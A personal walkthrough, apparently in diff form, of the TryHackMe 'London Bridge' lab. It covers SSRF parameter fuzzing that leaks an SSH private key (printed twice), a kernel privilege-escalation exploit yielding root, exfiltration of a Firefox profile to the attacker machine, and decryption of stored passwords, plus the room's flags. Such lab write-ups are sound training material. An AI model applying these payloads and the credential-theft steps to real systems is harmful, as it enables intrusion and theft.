@@ -1,0 +1,282 @@
+---------------TRYHACKME ROOM---------------
+Name : The London Bridge
+Link : https://tryhackme.com/r/room/thelondonbridge
+Date start : 05-12-2024
+Level : Medium
+Ip : 10.10.73.26
+
+
+--------Enumeration
+--> nmap -sC -sV 10.10.73.26 -T4
+	-22 --> SSH
+	-8080 --> HTTP http-proxy gunicorn
+
+
+
+Hint --> Check for other parameters that may been left over during the development phase. If one list doesn't work, try another common one.
+
+Comprehension --> after founding directory we will test for parameters
+
+
+
+------Enumeration of port 8080 HTTP
+--> gobuster dir -u http://10.10.73.26:8080/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 100
+	/contact              (Status: 200) [Size: 1703]
+	/feedback             (Status: 405) [Size: 178]
+	/gallery              (Status: 200) [Size: 1722]
+	/upload               (Status: 405) [Size: 178]
+	/dejaview             (Status: 200) [Size: 823]
+
+Quand je regardais sue le site j'ai remarque qq trucs 
+1- u peux upload une image sur le site et cette image va apparaitre donc a prem iere vue j'ai essayer de upload un reverse shell mais ca n'as pas marche
+2- commantaire : <!--To devs: Make sure that people can also add images using links-->  ds la page galery
+
+
+On the page : http://10.10.73.26:8080/view_image you can put a link of image to see it i will try nd after try a reverse shell.
+
+When i create my server with an image it is good but hen i try a reverse shell it dont work. let us continue our searching.
+
+
+Now we will use this commnd to bruteforce the parameter
+--> fuf -u http://10.10.73.26:8080/view_image -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -H 'Content-Type: application/x-www-form-urlencoded' -X POST -d 'FUZZ=http://10.2.9.70:8000/test' -mc all -t 50 -ic -fs 823
+
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : POST
+ :: URL              : http://10.10.73.26:8080/view_image
+ :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt
+ :: Header           : Content-Type: application/x-www-form-urlencoded
+ :: Data             : FUZZ=http://10.2.9.70:8000/test
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 50
+ :: Matcher          : Response status: all
+ :: Filter           : Response size: 823
+________________________________________________
+
+www                     [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1300ms]
+[WARN] Caught keyboard interrupt (Ctrl-C)
+
+Before thos we will create a file test and launch a python server
+--> python3 -m http.server
+
+
+--> send data in burp :
+POST /view_image HTTP/1.1
+Host: 10.10.73.26:8080
+Content-Length: 24
+Cache-Control: max-age=0
+Accept-Language: en-US,en;q=0.9
+Origin: http://10.10.73.26:8080
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://10.10.73.26:8080/dejaview
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
+www=http://0/.ssh/id_rsa
+
+
+
+
+
+
+
+--> recieve data in burp 
+HTTP/1.1 200 OK
+Server: gunicorn
+Date: Thu, 05 Dec 2024 11:18:25 GMT
+Connection: keep-alive
+Content-Type: text/html; charset=utf-8
+Content-Length: 1675
+
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEAz1yFrg9FAZAI4R37aQWn/ePTk/MKfz2KQ+OE45KErguL34Yj
+5Kc1VJjDTTNRmc+vNRZieC8EwelWgpwcKACa70Ke2q/7zRLWHh23OUxWiSAAORTe
+a1s5eus3ghTWjcfONROAkEg7O3XsNwgp93UUB8wbU+ADpZnFLPUDErFKoSp+dxG4
+rxwqpAp6maqsE4dIZHdAq+Yt6/2HOERKrFWiONQpd6ZA8a325oWXY8UaREvKTuXc
+jlL56t4iWQzsRQbBvB+ETg2ma01u/HmW3M9SyroPypcEOqvPnuPpqXHZu7BwALM5
+NHhXCNmt+0EOBYKvejsDA6NeZfJgw65NVK+2hQIDAQABAoIBACJyZUaoBLegvMjg
+2S32IZUcrr4qJrlCeOCUQDQp196tzlughf/rAwH9qpv9hXW+uYVhJZR/gxPPdm6W
+Dlta1mIeuBLuHy9PDMDOAO0E0G9RIJha7iP5cJAJ2RvD6Gx/H7NTfQz64tQa39W4
+hng0O9KbxoJleVWeONIiFZOaXiJthuro/d9GSivMBJyT8PR3JG6G+R4Qq1tAJqEU
+Hx5DY/U7qVYQ1TE3EfbDR5y0+972fW7J0oZxOuwK6IWP9TtHcPPVIGweaIgZFys3
+3ZFEzON5qRhNdV8lc127cUX5R5hFjn14GHJLpvbjkt8D9DggUKKNR8zPJfIGO5Tp
+gdzclmECgYEA+kaVi0hq1sYSdZL4wHxDQJfGooPn8Hae8zFrsYjrVD8nOQ9NEz4N
+XKqlGMhPc8P0PvuoKy1341ty966S8J+dKfdPzRURFzB84wy3A6CDnViRpCYwKFo0
+Aa5wwpWZalBBpEis0h3YKCKVKyhs4/uN6lMw5H3GaCMdqqm00l9DRm0CgYEA1Bqq
+e2pPYVCwyQb20/8aP305wu6Bdp+i3dUqkHndhPXmEL8EnXbEJuBymn7aKQ3Ln/zX
+8G/7Mze845g93KAPFLeeNk/AmzXKnWB8mgcrFzxAD/wAxH1J9otLvhmX7BRVE6X/
+0he6g1mdtNMXbt0B/aMOS+dCsMW1C/7oUfbxAXkCgYAlCvVvXBSUHVT2Gf6/XqUF
+lnFL9IIL0ULNc+8go8dQ/NftVhpuUqzfnlI5TMyVsdcgy1akrWIlQI/PoQMWokk8
+wOIK1Kdm60JQyLz9yHAyhb1osk5GarNv3EXMRyAh4CcXDbqmjsxDhHrXnHAhfkYO
+/Kkr6IHJQAlQDTY6POdUMQKBgQCPPkMMfkuFyVzbJtzjZ1Futz+fKjw8xKrVbfUF
+BYhZF0h83sRbI65tIv/C3xCu0SZHshaTxsy7VlU2z8ZXjbEhqLAstce6CqX/iv4b
+d+PeGU6afPJ3wLWGz6Qjil1Tjpe2YVFXrbbEpm0fhcA5mwCRLuGk2VXs1Fjk9Q4o
+7MDu4QKBgFIomwhD+jmr3Vc2HutYkl3zliSD239sH3k118sTHbedvKH5Q7nw0C+U
+a7RMp/cXWZKdyRgFxQ7DQEorzWi5bLAyxXnMg0ghwWdf4nugQmaEG7t+OYUNsf7M
+fDLzMA915WcODR6L0mWO0crAMbZQOkg1KlAiwQSQmuUpPqyAfq6x
+-----END RSA PRIVATE KEY-----
+
+
+
+
+ curl -s 'http://10.10.73.26:8080/view_image' -d 'www=http://127.1/.ssh/id_rsa' -o id_rsa
+                                                                                                                              
+┌──(root㉿kali)-[/home/kali/Desktop/rooms/london_bridge]
+└─# ls
+id_rsa  images.jpeg  note.txt  revshell.php  test
+                                                                                                                              
+┌──(root㉿kali)-[/home/kali/Desktop/rooms/london_bridge]
+└─# cat id_rsa 
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEAz1yFrg9FAZAI4R37aQWn/ePTk/MKfz2KQ+OE45KErguL34Yj
+5Kc1VJjDTTNRmc+vNRZieC8EwelWgpwcKACa70Ke2q/7zRLWHh23OUxWiSAAORTe
+a1s5eus3ghTWjcfONROAkEg7O3XsNwgp93UUB8wbU+ADpZnFLPUDErFKoSp+dxG4
+rxwqpAp6maqsE4dIZHdAq+Yt6/2HOERKrFWiONQpd6ZA8a325oWXY8UaREvKTuXc
+jlL56t4iWQzsRQbBvB+ETg2ma01u/HmW3M9SyroPypcEOqvPnuPpqXHZu7BwALM5
+NHhXCNmt+0EOBYKvejsDA6NeZfJgw65NVK+2hQIDAQABAoIBACJyZUaoBLegvMjg
+2S32IZUcrr4qJrlCeOCUQDQp196tzlughf/rAwH9qpv9hXW+uYVhJZR/gxPPdm6W
+Dlta1mIeuBLuHy9PDMDOAO0E0G9RIJha7iP5cJAJ2RvD6Gx/H7NTfQz64tQa39W4
+hng0O9KbxoJleVWeONIiFZOaXiJthuro/d9GSivMBJyT8PR3JG6G+R4Qq1tAJqEU
+Hx5DY/U7qVYQ1TE3EfbDR5y0+972fW7J0oZxOuwK6IWP9TtHcPPVIGweaIgZFys3
+3ZFEzON5qRhNdV8lc127cUX5R5hFjn14GHJLpvbjkt8D9DggUKKNR8zPJfIGO5Tp
+gdzclmECgYEA+kaVi0hq1sYSdZL4wHxDQJfGooPn8Hae8zFrsYjrVD8nOQ9NEz4N
+XKqlGMhPc8P0PvuoKy1341ty966S8J+dKfdPzRURFzB84wy3A6CDnViRpCYwKFo0
+Aa5wwpWZalBBpEis0h3YKCKVKyhs4/uN6lMw5H3GaCMdqqm00l9DRm0CgYEA1Bqq
+e2pPYVCwyQb20/8aP305wu6Bdp+i3dUqkHndhPXmEL8EnXbEJuBymn7aKQ3Ln/zX
+8G/7Mze845g93KAPFLeeNk/AmzXKnWB8mgcrFzxAD/wAxH1J9otLvhmX7BRVE6X/
+0he6g1mdtNMXbt0B/aMOS+dCsMW1C/7oUfbxAXkCgYAlCvVvXBSUHVT2Gf6/XqUF
+lnFL9IIL0ULNc+8go8dQ/NftVhpuUqzfnlI5TMyVsdcgy1akrWIlQI/PoQMWokk8
+wOIK1Kdm60JQyLz9yHAyhb1osk5GarNv3EXMRyAh4CcXDbqmjsxDhHrXnHAhfkYO
+/Kkr6IHJQAlQDTY6POdUMQKBgQCPPkMMfkuFyVzbJtzjZ1Futz+fKjw8xKrVbfUF
+BYhZF0h83sRbI65tIv/C3xCu0SZHshaTxsy7VlU2z8ZXjbEhqLAstce6CqX/iv4b
+d+PeGU6afPJ3wLWGz6Qjil1Tjpe2YVFXrbbEpm0fhcA5mwCRLuGk2VXs1Fjk9Q4o
+7MDu4QKBgFIomwhD+jmr3Vc2HutYkl3zliSD239sH3k118sTHbedvKH5Q7nw0C+U
+a7RMp/cXWZKdyRgFxQ7DQEorzWi5bLAyxXnMg0ghwWdf4nugQmaEG7t+OYUNsf7M
+fDLzMA915WcODR6L0mWO0crAMbZQOkg1KlAiwQSQmuUpPqyAfq6x
+-----END RSA PRIVATE KEY-----
+                                                                                                                              
+┌──(root㉿kali)-[/home/kali/Desktop/rooms/london_bridge]
+└─#  curl -s 'http://10.10.73.26:8080/view_image' -d 'www=http://127.1/.ssh/authorized_keys'
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPXIWuD0UBkAjhHftpBaf949OT8wp/PYpD44TjkoSuC4vfhiPkpzVUmMNNM1GZz681FmJ4LwTB6VaCnBwoAJrvQp7ar/vNEtYeHbc5TFaJIAA5FN5rWzl66zeCFNaNx841E4CQSDs7dew3CCn3dRQHzBtT4AOlmcUs9QMSsUqhKn53EbivHCqkCnqZqqwTh0hkd0Cr5i3r/Yc4REqsVaI41Cl3pkDxrfbmhZdjxRpES8pO5dyOUvnq3iJZDOxFBsG8H4RODaZrTW78eZbcz1LKug/KlwQ6q8+e4+mpcdm7sHAAszk0eFcI2a37QQ4Fgq96OwMDo15l8mDDrk1Ur7aF beth@london
+                                                                                                                              
+┌──(root㉿kali)-[/home/kali/Desktop/rooms/london_bridge]
+└─# ssh beth@10.10.168.94 -i id_rsa
+
+beth@london:~$ find / -iname "user.txt" 2>/dev/null
+/home/beth/__pycache__/user.txt
+beth@london:~$ cat /home/beth/__pycache__/user.txt
+-------------------User flag---------------------------------> THM{l0n6_l1v3_7h3_qu33n}----------------------------------
+
+
+After checking crons, suid files and other things i found nothinhg but when i do uname -a  i foud something
+
+beth@london:~$ find / -perm -u=s -type f 2> /dev/null
+/bin/fusermount
+/bin/su
+/bin/ping
+/bin/mount
+/bin/umount
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/vmware-user-suid-wrapper
+/usr/bin/traceroute6.iputils
+/usr/bin/newuidmap
+/usr/bin/sudo
+/usr/bin/newgidmap
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+beth@london:~$ uname -a
+Linux london 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+beth@london:~$
+
+
+so i search on search exploit i i foud sth.
+link : https://www.exploit-db.com/exploits/47167
+
+
+
+but the exploit which works was : https://github.com/bcoles/kernel-exploits/blob/master/CVE-2018-18955/exploit.dbus.sh
+
+beth@london:/tmp/10.2.9.70:8000/polkit$ bash exploit.sh 
+[*] Compiling...
+[*] Creating /usr/share/dbus-1/system-services/org.subuid.Service.service...
+[.] starting
+[.] setting up namespace
+[~] done, namespace sandbox set up
+[.] mapping subordinate ids
+[.] subuid: 100000
+[.] subgid: 100000
+[~] done, mapped subordinate ids
+[.] executing subshell
+[*] Creating /etc/dbus-1/system.d/org.subuid.Service.conf...
+[.] starting
+[.] setting up namespace
+[~] done, namespace sandbox set up
+[.] mapping subordinate ids
+[.] subuid: 100000
+[.] subgid: 100000
+[~] done, mapped subordinate ids
+[.] executing subshell
+[*] Launching dbus service...
+Error org.freedesktop.DBus.Error.NoReply: Did not receive a reply. Possible causes include: the remote application did not sd a reply, the message bus security policy blocked the reply, the reply timeout expired, or the network connection was broke
+[+] Success:
+-rwsrwxr-x 1 root root 8392 Dec  6 01:23 /tmp/sh
+[*] Cleaning up...
+[*] Launching root shell: /tmp/sh
+root@london:/tmp/10.2.9.70:8000/polkit#
+
+root@london:/root# cat .root.txt 
+THM{l0nd0n_br1d63_p47ch3d}
+
+
+
+root@london:/home/charles/.mozilla# tar -czvf firefox.tar.gz firefox/
+root@london:/home/charles/.mozilla# ls
+firefox  firefox.tar.gz
+root@london:/home/charles/.mozilla# python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.2.9.70 - - [06/Dec/2024 01:37:31] "GET /firefox.tar.gz HTTP/1.1" 200 -
+^C
+Keyboard interrupt received, exiting.
+root@london:/home/charles/.mozilla# 
+
+
+to decompress tar -xzvf firefox.tar.gz
+
+python decryptor ---> https://raw.githubusercontent.com/unode/firefox_decrypt/refs/heads/main/firefox_decrypt.py
+
+┌──(root㉿kali)-[/home/kali/Desktop/rooms/london_bridge]
+└─# nano fireforx_decryptor.py
+                                                                                                             
+┌──(root㉿kali)-[/home/kali/Desktop/rooms/london_bridge]
+└─# python3 fireforx_decryptor.py firefox/8k3bf3zp.charles 
+2024-12-06 04:40:58,757 - WARNING - profile.ini not found in firefox/8k3bf3zp.charles
+2024-12-06 04:40:58,757 - WARNING - Continuing and assuming 'firefox/8k3bf3zp.charles' is a profile location
+
+Website:   https://www.buckinghampalace.com
+Username: 'Charles'
+Password: 'thekingofengland'
+                                                                                                             
+┌──(root㉿kali)-[/home/kali/Desktop/rooms/london_bridge]
+└─# 
+
+
+Thank you for reading my opinion of the room @petstar from togo
